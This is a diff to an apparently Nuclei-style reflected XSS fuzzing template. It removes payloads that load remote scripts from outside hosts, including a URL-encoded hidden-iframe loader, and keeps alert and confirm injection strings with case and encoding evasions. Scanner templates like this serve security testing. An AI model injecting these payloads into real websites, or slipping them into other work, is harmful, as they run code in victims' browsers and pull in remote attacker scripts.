@@ -17,10 +17,6 @@ http:
     payloads:
       reflection:
         - "'\"><{{first}}"
-        - "<script>$.getScript(\"//satya.bxss.in\")</script>"
-        - "</script><script%20/src=//0xkayala.github.io/xss-poc.js></script>"><41707"
-        - "<script /src=//0xkayala.github.io/xss-poc.js></script>"
-        - "<script src="//0xkayala.github.io/xss-poc.js"></script>"
         - "<img src=x onerror=alert({{first}})>"
         - "<script>alert({{first}})</script>"
         - "'><ScRiPt>alert({{first}})</sCrIpT>"
@@ -29,10 +25,7 @@ http:
         - "<body onload=alert({{first}})>"
         - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
         - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
-        - "</script><script src='https://satya.ez.pe'></script>"
-        - "<script src=//satya.ez.pe></script>"
         - "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
-        - "%3Cdiv%20id%3D%22load%22%3E%3C%2Fdiv%3E%3Cscript%3Evar%20i%20%3D%20document.createElement%28%27iframe%27%29%3B%20i.style.display%20%3D%20%27none%27%3B%20i.onload%20%3D%20function%28%29%20%7B%20i.contentWindow.location.href%20%3D%20%27%2F%2F0xkayala.github.io/xss-poc.js%27%3B%20%7D%3B%20document.getElementById%28%27load%27%29.appendChild%28i%29%3B%3C%2Fscript%3E"
 
     fuzzing:
       - part: query
